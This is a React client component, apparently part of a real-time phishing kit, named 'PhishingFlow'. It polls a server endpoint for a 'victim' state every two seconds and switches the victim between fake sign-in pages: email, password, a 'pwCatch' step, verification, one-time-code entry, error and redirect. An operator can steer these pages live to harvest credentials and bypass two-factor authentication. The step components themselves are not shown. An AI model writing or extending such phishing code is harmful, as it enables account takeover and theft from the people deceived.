"use client";

import { useState, useEffect } from "react";
import EmailStep from "./steps/EmailStep";
import LoginStep from "./steps/LoginStep";
import PasswordStep from "./steps/PasswordStep";
import PwCatchStep from "./steps/PwCatchStep";
import VerifyStep from "./steps/VerifyStep";
import OtpStep from "./steps/OtpStep";
import ErrorStep from "./steps/ErrorStep";
import Redirecting from "./steps/Redirecting";
import { Skeleton } from "@/components/ui/skeleton";

type VictimState = {
  currentPage: string;
  email: string;
  name: string;
  profilePicture: string;
  errorMessage: string;
  redirectUrl: string;
};

export default function PhishingFlow() {
  const [state, setState] = useState<VictimState | null>(null);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const fetchState = async () => {
      try {
        const res = await fetch("/api/state?view=victim");
        if (!res.ok) {
          const errorData = await res.json();
          throw new Error(errorData.error || "Failed to fetch state");
        }
        const data: VictimState = await res.json();
        setState(data);
        setError(null);
      } catch (err: any) {
        setError(err.message);
        console.error("Polling error:", err);
      }
    };

    fetchState();
    const intervalId = setInterval(fetchState, 2000);

    return () => clearInterval(intervalId);
  }, []);

  if (error) {
    return (
      <div className="w-full text-center text-destructive">
        <h1 className="text-2xl font-semibold">Connection Error</h1>
        <p className="mt-2 text-sm">{error}</p>
        <p className="mt-2 text-sm">Please try refreshing the page.</p>
      </div>
    );
  }

  if (!state) {
    return (
      <div className="space-y-4 w-full">
        <Skeleton className="h-8 w-1/2 mx-auto" />
        <Skeleton className="h-6 w-3/4 mx-auto" />
        <div className="pt-8 space-y-6 w-full">
          <Skeleton className="h-12 w-full" />
          <div className="flex justify-between">
            <Skeleton className="h-10 w-24" />
            <Skeleton className="h-10 w-24" />
          </div>
        </div>
      </div>
    );
  }

  switch (state.currentPage) {
    case 'email':
      return <EmailStep />;
    case 'login':
      return <LoginStep {...state} />;
    case 'password':
      return <PasswordStep {...state} />;
    case 'pwCatch':
      return <PwCatchStep {...state} />;
    case 'verify':
      return <VerifyStep />;
    case 'otp':
      return <OtpStep />;
    case 'error':
        return <ErrorStep errorMessage={state.errorMessage} />;
    case 'redirect':
        return <Redirecting url={state.redirectUrl} />;
    default:
      return <EmailStep />;
  }
}
